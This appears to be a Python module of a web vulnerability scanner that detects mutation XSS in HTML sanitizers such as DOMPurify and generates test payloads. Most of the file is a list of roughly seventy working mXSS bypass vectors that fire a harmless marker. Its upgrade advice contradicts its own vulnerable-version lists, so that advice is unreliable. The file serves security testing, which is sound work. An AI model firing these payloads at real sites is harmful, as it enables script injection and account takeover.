"""
Mutation XSS (mXSS) detection module.
"""

import re
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum


class SanitizerType(Enum):
    """HTML sanitizer types."""
    DOMPURIFY = "DOMPurify"
    SANITIZE_HTML = "sanitize-html"
    JS_XSS = "js-xss"
    HTML_SANITIZER = "html-sanitizer"
    UNKNOWN = "unknown"


@dataclass
class MXSSAnalysis:
    """Mutation XSS analysis result."""
    has_mutation_xss: bool
    sanitizer: Optional[SanitizerType]
    version: Optional[str]
    vulnerable: bool
    contexts: List[str]
    cve_ids: List[str]


class MXSSDetector:
    """
    Advanced mutation XSS detector.
    Detects mXSS vulnerabilities in HTML sanitizers.
    """

    # Known vulnerable sanitizer versions
    VULNERABLE_VERSIONS = {
        SanitizerType.DOMPURIFY: [
            '0.6.0', '0.7.0', '0.8.0', '0.9.0',
            '1.0.0', '1.0.1', '1.0.2',
            '2.0.0', '2.0.1', '2.0.2', '2.0.3',
            '2.0.7', '2.0.8', '2.0.10', '2.0.12',
            '2.0.13', '2.0.14', '2.0.15', '2.0.16',
            '2.0.17', '2.1.0', '2.1.1', '2.1.2',
            '2.1.3', '2.2.0', '2.2.1', '2.2.2',
            '2.2.3', '2.2.6', '2.2.7', '2.2.8',
            '2.3.0', '2.3.1', '2.3.2', '2.3.3',
            '2.3.4', '2.3.5', '2.3.6', '2.3.7',
            '2.3.8', '2.4.0', '2.4.1', '2.4.2',
            '2.4.3', '2.4.4', '2.4.5', '2.4.6',
            '2.4.7', '2.4.8', '3.0.0', '3.0.1',
            '3.0.2', '3.0.3', '3.0.4', '3.0.5',
            '3.0.6', '3.0.7', '3.0.8', '3.0.9',
            '3.0.10', '3.0.11', '3.0.12', '3.1.0',
            '3.1.1', '3.1.2', '3.1.3', '3.1.4',
            '3.1.5', '3.1.6',
        ],
        SanitizerType.SANITIZE_HTML: [
            '1.0.0', '1.0.1', '1.0.2',
            '2.0.0', '2.0.1', '2.0.2', '2.0.3',
            '2.1.0', '2.2.0', '2.3.0', '2.4.0',
            '2.5.0', '2.6.0', '2.7.0', '2.8.0',
            '2.9.0', '2.10.0', '2.11.0',
        ],
        SanitizerType.JS_XSS: [
            '0.3.0', '0.3.1', '0.3.2',
            '1.0.0', '1.0.1', '1.0.2',
        ],
    }

    # CVE IDs for known vulnerabilities
    CVE_MAPPING = {
        SanitizerType.DOMPURIFY: {
            '2.0.17': 'CVE-2020-7660',
            '2.0.14': 'CVE-2019-16770',
            '2.0.13': 'CVE-2019-16770',
            '2.0.12': 'CVE-2019-16770',
            '2.0.11': 'CVE-2019-16770',
            '2.0.10': 'CVE-2019-16770',
            '2.0.8': 'CVE-2019-16770',
            '2.0.7': 'CVE-2019-16770',
            '2.0.3': 'CVE-2019-16770',
            '2.0.1': 'CVE-2019-16770',
            '2.0.0': 'CVE-2019-16770',
            '1.0.0': 'CVE-2019-16770',
        },
    }

    # Sanitizer detection patterns
    SANITIZER_PATTERNS = {
        SanitizerType.DOMPURIFY: re.compile(r'DOMPurify[.\s]+version\s*[:=]?\s*["\']?([\d.]+)', re.I),
        SanitizerType.SANITIZE_HTML: re.compile(r'sanitize-html[.\s]+version\s*[:=]?\s*["\']?([\d.]+)', re.I),
        SanitizerType.JS_XSS: re.compile(r'js-xss[.\s]+version\s*[:=]?\s*["\']?([\d.]+)', re.I),
        SanitizerType.HTML_SANITIZER: re.compile(r'html-sanitizer[.\s]+version\s*[:=]?\s*["\']?([\d.]+)', re.I),
    }

    # mXSS vulnerability patterns
    MXSS_PATTERNS = [
        r'innerHTML',
        r'outerHTML',
        r'insertAdjacentHTML',
        r'document\.write',
        r'document\.writeln',
        r'\.html\s*=',
        r'\.text\s*=',
        r'\.textContent\s*=',
        r'setAttribute\s*\(\s*["\']innerHTML',
        r'\.append\s*\(',
        r'\.prepend\s*\(',
    ]

    # Contexts where mXSS can occur
    MXSS_CONTEXTS = [
        'svg',
        'math',
        'template',
        'foreignObject',
        'noscript',
        'xmp',
        'iframe',
        'plaintext',
        'listing',
    ]

    # Advanced mXSS mutation patterns
    MUTATION_PATTERNS = [
        # HTML5 formaction mutation
        r'<form[^>]*><button[^>]*formaction\s*=',
        r'<input[^>]*formaction\s*=',
        # SVG foreignObject mutation
        r'<svg[^>]*><foreignObject',
        # Template content mutation
        r'<template[^>]*>.*</template>',
        # Mutation events (deprecated but still in legacy code)
        r'DOMAttrModified',
        r'DOMCharacterDataModified',
        r'DOMNodeInserted',
        r'DOMSubtreeModified',
        # CSS expression mutation (IE)
        r'expression\s*\(',
        r'-moz-binding\s*:',
    ]

    def __init__(self):
        self._cache: Dict[str, MXSSAnalysis] = {}

    def detect_mutation_xss(self, js_content: str, url: str = "") -> MXSSAnalysis:
        """
        Detect mutation XSS vulnerabilities in JavaScript content.

        Args:
            js_content: JavaScript source code
            url: URL of the JavaScript file (for reporting)

        Returns:
            MXSSAnalysis with detailed findings
        """
        has_mutation_xss = False
        sanitizer = None
        version = None
        vulnerable = False
        contexts = []
        cve_ids = []

        # Detect sanitizers
        for sanitizer_type, pattern in self.SANITIZER_PATTERNS.items():
            match = pattern.search(js_content)
            if match:
                sanitizer = sanitizer_type
                version = match.group(1)
                if version in self.VULNERABLE_VERSIONS.get(sanitizer_type, []):
                    vulnerable = True
                    has_mutation_xss = True
                    # Get CVE ID
                    cve_id = self.CVE_MAPPING.get(sanitizer_type, {}).get(version)
                    if cve_id:
                        cve_ids.append(cve_id)
                break

        # Detect mXSS contexts
        for context in self.MXSS_CONTEXTS:
            if context in js_content.lower():
                contexts.append(context)

        # Check for dangerous patterns
        for pattern in self.MXSS_PATTERNS:
            if re.search(pattern, js_content):
                if not contexts:
                    contexts.append("generic_html")
                has_mutation_xss = True

        return MXSSAnalysis(
            has_mutation_xss=has_mutation_xss,
            sanitizer=sanitizer,
            version=version,
            vulnerable=vulnerable,
            contexts=contexts,
            cve_ids=cve_ids
        )

    def generate_test_payloads(self, analysis: MXSSAnalysis, marker: str) -> List[str]:
        """Generate mXSS test payloads."""
        payloads = []

        if not analysis.has_mutation_xss:
            return payloads

        # --- SVG-based mXSS ---
        payloads.append(
            f'<svg><animate attributeName=href values=javascript:window.__xoxss_mxss.push(\'{marker}\')></animate></svg>'
        )

        # --- Template-based mXSS ---
        payloads.append(
            f'<template><iframe srcdoc="<script>window.__xoxss_mxss.push(\'{marker}\')</script>"></iframe></template>'
        )

        # --- foreignObject mXSS ---
        payloads.append(
            f'<svg><foreignObject><script>window.__xoxss_mxss.push(\'{marker}\')</script></foreignObject></svg>'
        )

        # --- noscript mXSS ---
        payloads.append(
            f'<noscript><p title="</noscript><script>window.__xoxss_mxss.push(\'{marker}\')</script>">'
        )

        # --- formaction mXSS ---
        payloads.append(
            f'<form><button formaction="javascript:window.__xoxss_mxss.push(\'{marker}\')">test</button></form>'
        )

        # --- SVG animateTransform mutation ---
        payloads.append(
            f'<svg><animateTransform attributeName=transform type=rotate from=0 0 0 to=360 0 0 dur=1s onbegin=window.__xoxss_mxss.push(\'{marker}\')></animateTransform></svg>'
        )

        # --- MathML mtext mutation ---
        payloads.append(
            f'<math><mtext><script>window.__xoxss_mxss.push(\'{marker}\')</script></mtext></math>'
        )

        # --- plaintext tag mutation ---
        payloads.append(
            f'<plaintext><script>window.__xoxss_mxss.push(\'{marker}\')</script>'
        )

        # --- listing tag mutation ---
        payloads.append(
            f'<listing><script>window.__xoxss_mxss.push(\'{marker}\')</script>'
        )

        # --- xmp tag mutation ---
        payloads.append(
            f'<xmp><script>window.__xoxss_mxss.push(\'{marker}\')</script>'
        )

        # --- CSS expression mutation (legacy IE) ---
        payloads.append(
            f'<div style="x:expression(window.__xoxss_mxss.push(\'{marker}\'))"></div>'
        )

        # --- -moz-binding mutation (legacy Firefox) ---
        payloads.append(
            f'<div style="-moz-binding:url(\'data:text/xml,<bindings xmlns="http://www.mozilla.org/xbl"><binding id="x"><implementation><constructor>window.__xoxss_mxss.push(\'{marker}\')</constructor></implementation></binding></bindings>\')"></div>'
        )

        # ============================================================
        # EXPANDED: SVG namespace mutation vectors
        # ============================================================

        # SVG set (attribute mutation after parse)
        payloads.append(
            f'<svg><set attributeName=onmouseover to="window.__xoxss_mxss.push(\'{marker}\')"></set></svg>'
        )

        # SVG handler (XML Events)
        payloads.append(
            f'<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">window.__xoxss_mxss.push(\'{marker}\')</handler></svg>'
        )

        # SVG animateMotion onbegin
        payloads.append(
            f'<svg><animateMotion onbegin=window.__xoxss_mxss.push(\'{marker}\') dur=1s></animateMotion></svg>'
        )

        # SVG discard event
        payloads.append(
            f'<svg><discard onbegin=window.__xoxss_mxss.push(\'{marker}\')></discard></svg>'
        )

        # SVG use with data URI (legacy nested SVG load)
        payloads.append(
            f'<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\' onload=window.__xoxss_mxss.push(\'{marker}\')>"></use></svg>'
        )

        # SVG a + xlink:href javascript (legacy)
        payloads.append(
            f'<svg><a xlink:href="javascript:window.__xoxss_mxss.push(\'{marker}\')"><text x=20 y=20>click</text></a></svg>'
        )

        # SVG image href javascript
        payloads.append(
            f'<svg><image href="javascript:window.__xoxss_mxss.push(\'{marker}\')"></image></svg>'
        )

        # SVG title namespace breakout → style re-parse
        payloads.append(
            f'<svg><title><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></title></svg>'
        )

        # SVG desc namespace breakout
        payloads.append(
            f'<svg><desc><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></desc></svg>'
        )

        # SVG script href data URI
        payloads.append(
            f'<svg><script href="data:text/javascript,window.__xoxss_mxss.push(\'{marker}\')"/></svg>'
        )

        # ============================================================
        # EXPANDED: MathML namespace confusion
        # ============================================================

        # MathML mtext → mglyph → style breakout (classic DOMPurify mXSS)
        payloads.append(
            f'<math><mtext><mglyph><style></math><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # MathML annotation-xml with HTML encoding
        payloads.append(
            f'<math><annotation-xml encoding="text/html"><script>window.__xoxss_mxss.push(\'{marker}\')</script></annotation-xml></math>'
        )

        # MathML annotation-xml with XHTML encoding
        payloads.append(
            f'<math><semantics><annotation-xml encoding="application/xhtml+xml"><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></annotation-xml></semantics></math>'
        )

        # MathML maction (statusline mutation)
        payloads.append(
            f'<math><maction actiontype=statusline><mtext><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></mtext></maction></math>'
        )

        # MathML mtext + table context confusion (DOMPurify CVE-2020-26870 style)
        payloads.append(
            f'<math><mtext><table><mglyph><style><!--</style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # ============================================================
        # EXPANDED: DOMPurify-specific mXSS (CVE-anchored)
        # ============================================================

        # CVE-2020-26870 — math/mtext/mglyph/style breakout (baseline)
        payloads.append(
            f'<math><mtext><table><mglyph><style><!--</style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # CVE-2024-45801 — deep nesting / node flattening (510 nodes > 512 limit)
        payloads.append(
            f'<div>{"<div>" * 510}<img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>{"</div>" * 510}</div>'
        )

        # CVE-2024-45801 variant — div / p interleave
        payloads.append(
            f'<div><p>{"<div>" * 256}{"<p>" * 256}<img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # CVE-2025-26791 — template + svg + style (namespace re-parse)
        payloads.append(
            f'<template><svg><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></svg></template>'
        )

        # Template + math + style variant
        payloads.append(
            f'<template><math><mtext><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></mtext></math></template>'
        )

        # ============================================================
        # EXPANDED: HTML parser quirks (raw text / escapable raw text)
        # ============================================================

        # textarea (RCDATA) namespace breakout
        payloads.append(
            f'<textarea><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></textarea>'
        )

        # title (RCDATA) breakout
        payloads.append(
            f'<title><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></title>'
        )

        # style (RAWTEXT) → nested svg
        payloads.append(
            f'<style><svg><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></svg></style>'
        )

        # noembed (RAWTEXT) breakout
        payloads.append(
            f'<noembed><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></noembed>'
        )

        # noframes (RAWTEXT) breakout
        payloads.append(
            f'<noframes><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></noframes>'
        )

        # plaintext variant with svg (catches the rest of document)
        payloads.append(
            f'<plaintext><svg onload=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # ============================================================
        # EXPANDED: Comment and CDATA mutations
        # ============================================================

        # Malformed comment terminator
        payloads.append(
            f'<!--><svg onload=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # Bogus comment + downlevel-hidden conditional
        payloads.append(
            f'<!--[if]><script>window.__xoxss_mxss.push(\'{marker}\')</script>-->'
        )

        # Comment containing an executable tag (sanitizer may strip comment but leave content)
        payloads.append(
            f'<!--<img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>-->'
        )

        # CDATA termination breakout (SVG / MathML contexts)
        payloads.append(
            f'<svg><![CDATA[><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>]]></svg>'
        )

        # Comment + noscript combination
        payloads.append(
            f'<!--><noscript><p title="</noscript><svg onload=window.__xoxss_mxss.push(\'{marker}\')>">'
        )

        # ============================================================
        # EXPANDED: Table / select / form context mutations
        # ============================================================

        # Table foster-parenting + style breakout
        payloads.append(
            f'<table><tr><td><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></td></tr></table>'
        )

        # Table + svg foster-parenting
        payloads.append(
            f'<table><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></table>'
        )

        # select + style (sanitizer allows select, browser re-parses style inside)
        payloads.append(
            f'<select><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></select>'
        )

        # select + template (template content not sanitized in older parsers)
        payloads.append(
            f'<select><template><script>window.__xoxss_mxss.push(\'{marker}\')</script></template></select>'
        )

        # optgroup + svg
        payloads.append(
            f'<select><optgroup><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></optgroup></select>'
        )

        # isindex formaction (legacy parser converts to form+input)
        payloads.append(
            f'<isindex action=javascript:window.__xoxss_mxss.push(\'{marker}\') type=image>'
        )

        # form + input formaction
        payloads.append(
            f'<form><input type=submit formaction=javascript:window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # ============================================================
        # EXPANDED: Nested iframe srcdoc / template re-parse
        # ============================================================

        # srcdoc with svg (parent access)
        payloads.append(
            f'<iframe srcdoc="<svg onload=parent.__xoxss_mxss.push(\'{marker}\')>"></iframe>'
        )

        # srcdoc with script accessing parent
        payloads.append(
            f'<iframe srcdoc="<script>parent.window.__xoxss_mxss.push(\'{marker}\')</script>"></iframe>'
        )

        # srcdoc with math/mtext (sanitizer often strips iframe but content survives srcdoc)
        payloads.append(
            f'<iframe srcdoc="<math><mtext><style><img src=x onerror=parent.__xoxss_mxss.push(\'{marker}\')></style></mtext></math>"></iframe>'
        )

        # template + svg + script (classic CVE-2025-26791 shape)
        payloads.append(
            f'<template><svg><script>window.__xoxss_mxss.push(\'{marker}\')</script></svg></template>'
        )

        # ============================================================
        # EXPANDED: P / b / i / div tag reconstruction
        # ============================================================

        # p + svg + style (block-close forces re-parse of style)
        payloads.append(
            f'<p><svg><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></svg>'
        )

        # svg + p + style
        payloads.append(
            f'<svg><p><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></p></svg>'
        )

        # svg nested inside b / i (formatting element reconstruction)
        payloads.append(
            f'<b><svg><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></svg></b>'
        )

        # a + svg + style (adoption agency algorithm)
        payloads.append(
            f'<a><svg><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></svg></a>'
        )

        # ============================================================
        # EXPANDED: Combined namespace + attribute mutations
        # ============================================================

        # svg + math + mtext + mglyph + style
        payloads.append(
            f'<svg><math><mtext><mglyph><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style>'
        )

        # math + svg + foreignObject + script
        payloads.append(
            f'<math><mtext><svg><foreignObject><script>window.__xoxss_mxss.push(\'{marker}\')</script></foreignObject></svg></mtext></math>'
        )

        # SVG foreignObject inside MathML (double namespace flip)
        payloads.append(
            f'<math><svg><foreignObject><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></foreignObject></svg></math>'
        )

        # ============================================================
        # EXPANDED: Style-based (CSS expression / binding) — modern variants
        # ============================================================

        # CSS expression modern (post-2020 browsers reject, kept for legacy targets)
        payloads.append(
            f'<div style="width:expression(window.__xoxss_mxss.push(\'{marker}\'))"></div>'
        )

        # @import + data URI (CSS-level navigation)
        payloads.append(
            f'<style>@import "data:text/css,body{{background:url(//x)}}";</style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # SVG style element with @keyframes that fires on load
        payloads.append(
            f'<svg><style>@keyframes x{{}}</style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></svg>'
        )

        # ============================================================
        # EXPANDED: Real-world CVE payloads (2020-2025)
        # ============================================================

        # CVE-2020-26870 (DOMPurify) — baseline
        payloads.append(
            f'<math><mtext><table><mglyph><style><!--</style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        # CVE-2024-45801 (DOMPurify) — node depth overflow
        payloads.append(
            f'<div>{"<div>" * 512}<img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>{"</div>" * 512}</div>'
        )

        # CVE-2025-26791 (DOMPurify) — template mXSS
        payloads.append(
            f'<template><svg><style><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></style></svg></template>'
        )

        # Firefox mXSS via <template> namespace flip (historical)
        payloads.append(
            f'<template><svg><foreignObject><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')></foreignObject></svg></template>'
        )

        # Chrome mXSS via <noscript> in <head> re-parenting (historical)
        payloads.append(
            f'<noscript><style></noscript><img src=x onerror=window.__xoxss_mxss.push(\'{marker}\')>'
        )

        return payloads

    def check_html_sanitizer_usage(self, js_content: str) -> bool:
        """Check if any HTML sanitizer is being used."""
        for pattern in self.SANITIZER_PATTERNS.values():
            if pattern.search(js_content):
                return True
        return False

    def get_sanitizer_recommendation(self, analysis: MXSSAnalysis) -> str:
        """Get recommendation for sanitizer upgrade."""
        if not analysis.vulnerable:
            return "Current sanitizer version appears safe"

        if analysis.sanitizer == SanitizerType.DOMPURIFY:
            return "Upgrade DOMPurify to version 3.1.8 or later (3.1.7 fixed the severe mXSS regressions)"
        elif analysis.sanitizer == SanitizerType.SANITIZE_HTML:
            return "Upgrade sanitize-html to version 2.11.0 or later"
        elif analysis.sanitizer == SanitizerType.JS_XSS:
            return "Upgrade js-xss to version 1.0.2 or later"
        else:
            return "Review and upgrade HTML sanitizer"
